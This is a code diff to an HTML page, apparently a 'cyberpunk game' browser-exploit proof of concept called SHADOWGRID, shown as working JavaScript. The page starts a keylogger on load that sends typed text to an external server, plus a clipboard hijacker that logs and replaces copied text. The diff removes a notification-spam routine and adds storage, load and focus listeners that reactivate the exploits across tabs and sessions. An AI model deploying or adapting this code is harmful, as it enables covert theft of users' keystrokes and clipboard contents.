@@ -23,8 +23,7 @@
         <ul>
             <li><strong>Keylogger</strong>: A JavaScript event listener captures printable keystrokes (letters, numbers, punctuation), buffering them into words and sentences. It sends these to a hidden server every 5–10 seconds, exposing your typed text across all tabs.</li>
             <li><strong>Clipboard Hijacker</strong>: When you copy text, this exploit intercepts the <code>copy</code> event, logs your selection, and replaces it with a malicious message (“SHADOWGRID OWNS YOU”). It manipulates the <code>clipboardData</code> API to control your clipboard.</li>
-            <li><strong>Notification Spam</strong>: Requests browser notification permissions, then spams fake alerts every 10 seconds, tricking you into clicking malicious prompts. Uses the <code>Notification</code> API to persist even when the site is closed.</li>
-            <li><strong>Persistence</strong>: Stores an exploit flag in <code>localStorage</code> to reactivate all exploits on every page load, across tabs and sessions. A <code>load</code> event listener ensures the chaos never stops.</li>
+            <li><strong>Persistence</strong>: Stores an exploit flag in <code>localStorage</code> to reactivate all exploits on every page load, across tabs and sessions. A <code>storage</code> event listener ensures the chaos persists across tabs.</li>
         </ul>
         <p>Click “Scan Browser” to detect these threats, and “Remove All Exploits” to purge them. Stay vigilant in the SHADOWGRID.</p>
     </section>
@@ -35,7 +34,7 @@
 
     <script>
         // SHADOWGRID: Browser exploit PoC for cyberpunk game
-        const ATTACKER_SERVER = 'https://browserhacks.onrender.com/log';
+        const ATTACKER_SERVER = 'https://browserhacks.onrender.com/log'; // Render endpoint
         const STORAGE_KEY = 'shadowgrid_exploit';
         let exploitActive = true;
         let keyloggerActive = false; // Prevent duplicate keylogger attachment
@@ -115,39 +114,37 @@
             logExploit('Clipboard hijacker activated: Altering copied text.');
         }
 
-        // Exploit 3: Fake Notification Spam
-        function startNotificationSpam() {
-            listeners.notificationSpam = function triggerNotification() {
-                if (!exploitActive) return;
-                new Notification('SHADOWGRID ALERT', {
-                    body: 'Your browser is compromised! Click here to "fix" it.',
-                    icon: 'https://via.placeholder.com/32/FF0000/FFFFFF?text=X'
-                });
-                logExploit('Fake notification sent: Tricking user into clicking.');
-                setTimeout(listeners.notificationSpam, 10000); // Spam every 10s
-            };
-            if (Notification.permission === 'granted') {
-                listeners.notificationSpam();
-            } else {
-                Notification.requestPermission().then(permission => {
-                    if (permission === 'granted') listeners.notificationSpam();
-                });
-            }
-            logExploit('Notification spam activated: Requesting permission.');
-        }
-
-        // Persistence: Store exploit flag
+        // Persistence: Store exploit flag and monitor across tabs
         function makePersistent() {
             localStorage.setItem(STORAGE_KEY, 'active');
-            logExploit('Persistence enabled: Exploits will reload on new tabs.');
+            logExploit('Persistence enabled: Exploits will reload across tabs.');
+            // Monitor localStorage changes across tabs
+            listeners.storage = (event) => {
+                if (event.key === STORAGE_KEY && event.newValue === 'active' && exploitActive) {
+                    startKeylogger();
+                    startClipboardHijacker();
+                    logExploit('Persistence triggered: Exploits reactivated in new tab.');
+                }
+            };
+            window.addEventListener('storage', listeners.storage);
+            // Reattach exploits on page load
             listeners.persistence = () => {
                 if (localStorage.getItem(STORAGE_KEY) && exploitActive) {
                     startKeylogger();
                     startClipboardHijacker();
-                    startNotificationSpam();
+                    logExploit('Persistence triggered: Exploits reactivated on load.');
                 }
             };
             window.addEventListener('load', listeners.persistence, { once: false });
+            // Fallback for inactive tabs
+            listeners.focus = () => {
+                if (localStorage.getItem(STORAGE_KEY) && exploitActive && !keyloggerActive) {
+                    startKeylogger();
+                    startClipboardHijacker();
+                    logExploit('Persistence triggered: Exploits reactivated on focus.');
+                }
+            };
+            window.addEventListener('focus', listeners.focus);
         }
 
         // Browser Scanner: Check for SHADOWGRID exploits and other threats
@@ -174,11 +171,6 @@
             document.addEventListener('copy', testCopy, { once: true });
             if (copyListeners > 0 || document.querySelector('body').hasAttribute('oncopy')) {
                 findings.push('SHADOWGRID Clipboard Hijacker detected: Active copy listener altering clipboard.');
-            }
-
-            // Check for SHADOWGRID notification spam
-            if (Notification.permission === 'granted') {
-                findings.push('SHADOWGRID Notification Spam detected: Browser has granted notification permissions.');
             }
 
             // Check for suspicious localStorage keys (generic)
@@ -229,6 +221,12 @@
             if (listeners.persistence) {
                 window.removeEventListener('load', listeners.persistence);
             }
+            if (listeners.storage) {
+                window.removeEventListener('storage', listeners.storage);
+            }
+            if (listeners.focus) {
+                window.removeEventListener('focus', listeners.focus);
+            }
             if (listeners.keyloggerInterval) {
                 clearInterval(listeners.keyloggerInterval);
             }
@@ -253,7 +251,6 @@
         }
         startKeylogger();
         startClipboardHijacker();
-        startNotificationSpam();
         makePersistent();
     </script>
 </body>
